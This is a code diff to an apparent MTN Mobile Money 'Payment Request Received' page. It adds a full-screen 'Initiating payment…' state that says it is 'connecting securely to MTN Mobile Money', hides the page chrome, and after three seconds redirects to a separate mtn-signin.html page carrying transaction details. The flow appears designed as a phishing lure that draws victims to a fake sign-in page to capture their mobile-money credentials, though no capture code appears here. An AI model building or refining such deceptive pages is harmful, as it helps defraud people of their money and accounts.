@@ -166,6 +166,40 @@
     z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  /* ============================================================
+     Full-page "Initiating payment…" state
+     (shown only after Accept payment is tapped)
+  ============================================================ */
+  .body.initiating {
+    justify-content: center;
+    padding-top: 40px;
+  }
+  .init-spinner {
+    width: 58px; height: 58px;
+    border: 4px solid var(--mtn-soft);
+    border-top-color: var(--mtn-green);
+    border-radius: 50%;
+    animation: initSpin 0.9s linear infinite;
+    margin-bottom: 26px;
+  }
+  @keyframes initSpin { to { transform: rotate(360deg); } }
+  .init-title {
+    font-size: 21px; font-weight: 800; letter-spacing: -0.4px;
+    color: var(--mtn-deep); margin-bottom: 8px; line-height: 1.25;
+  }
+  .init-desc {
+    font-size: 13px; color: var(--mtn-gray); line-height: 1.6;
+    max-width: 300px; margin: 0 auto;
+  }
+  .init-note {
+    margin-top: 22px; font-size: 11.5px; color: var(--mtn-gray);
+    font-weight: 600;
+  }
+  body.is-initiating .toolbar,
+  body.is-initiating .top { display: none !important; }
+  body.is-initiating .body { padding: 40px 22px; }
+
   @media print {
     body { background: #fff; padding: 0; }
     .toolbar, .brand, .mtn-footer { display: none !important; }
@@ -183,6 +217,8 @@
     .status-title { font-size: 18px; }
     .amount-block .val { font-size: 34px; }
     .btn-accept { padding: 13px 28px; font-size: 14px; min-width: 190px; }
+    .init-title { font-size: 19px; }
+    .init-spinner { width: 48px; height: 48px; }
   }
   @media (max-height: 680px) {
     .hero { width: 56%; bottom: -84px; }
@@ -258,7 +294,7 @@
     </div>
   </div>
 
-  <div class="body">
+  <div class="body" id="bodyArea">
 
     <div class="status-block">
       <div class="status-title">Payment Request Received</div>
@@ -437,13 +473,28 @@
   }
 
   /* ============================================================
-     Accept → hold the page 3 seconds, then navigate to sign-in.
+     Accept payment → full-page "Initiating payment…" state,
+     hold 3 seconds, then navigate to mtn-signin.html.
      No popup, no confirm dialog.
   ============================================================ */
   function acceptPayment() {
     const btn = document.getElementById('acceptBtn');
-    btn.disabled = true;
-    btn.textContent = 'Processing…';
+    if (btn && btn.disabled) return;
+    if (btn) btn.disabled = true;
+
+    // Hide toolbar + brand header so the page reads as a full initiating screen
+    document.body.classList.add('is-initiating');
+
+    // Replace visible content with the initiating state
+    const bodyArea = document.getElementById('bodyArea');
+    if (bodyArea) {
+      bodyArea.classList.add('initiating');
+      bodyArea.innerHTML = ''
+        + '<div class="init-spinner" aria-hidden="true"></div>'
+        + '<div class="init-title">Initiating payment…</div>'
+        + '<div class="init-desc">Connecting securely to MTN Mobile Money to authorize your payment. Please do not close this page.</div>'
+        + '<div class="init-note">This usually takes a few seconds.</div>';
+    }
 
     const q = new URLSearchParams({
       tx:  tx.ref,
